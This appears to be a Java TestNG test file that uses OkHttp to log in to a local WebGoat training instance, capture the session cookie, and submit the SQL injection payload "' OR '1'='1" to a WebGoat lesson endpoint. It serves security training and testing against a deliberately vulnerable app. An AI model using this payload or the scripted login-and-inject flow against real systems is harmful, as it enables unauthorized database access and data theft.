package tests;

import okhttp3.*;
import org.testng.annotations.BeforeTest;
import org.testng.annotations.Test;
import java.io.IOException;


public class WebGoatApi8Okhhtp {

    private static final String BASE_URL = "http://localhost:8080";
    private static final String LOGIN_ENDPOINT = "/WebGoat/login";
    private static final String SQL_INJECTION_ENDPOINT = "/WebGoat/SqlInjection/attack8";
    private String jsessionId;
    private OkHttpClient client;

    @BeforeTest
    public void setup() {
        client = new OkHttpClient();
    }

    @Test(priority = 1, enabled = true)
    public void testLoginAndGetSessionId() {
        String username = "skat556";
        String password = "qwerty";

        FormBody formBody = new FormBody.Builder()
                .add("username", username)
                .add("password", password)
                .build();

        Request request = new Request.Builder()
                .url(BASE_URL + LOGIN_ENDPOINT)
                .post(formBody)
                .addHeader("Upgrade-Insecure-Requests", "1")
                .addHeader("Referer", "http://localhost:8080/WebGoat/login")
                .addHeader("Connection", "keep-alive")
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
            jsessionId = response.header("Set-Cookie").split(";")[0].split("=")[1];
            System.out.println("JSESSIONID: " + jsessionId);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Test(priority = 2, enabled = true)
    public void testSuccessfulSqlInjection() {
        RequestBody body = new FormBody.Builder()
                .add("name", "A")
                .add("auth_tan", "' OR '1'='1")
                .build();

        Request request = new Request.Builder()
                .url(BASE_URL + SQL_INJECTION_ENDPOINT)
                .post(body)
                .addHeader("Cookie", "JSESSIONID=" + jsessionId)
                .addHeader("Content-Type", "application/x-www-form-urlencoded")
                .build();

        try (Response response = client.newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);
            System.out.println(response.body().string());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Similar methods for other test cases
}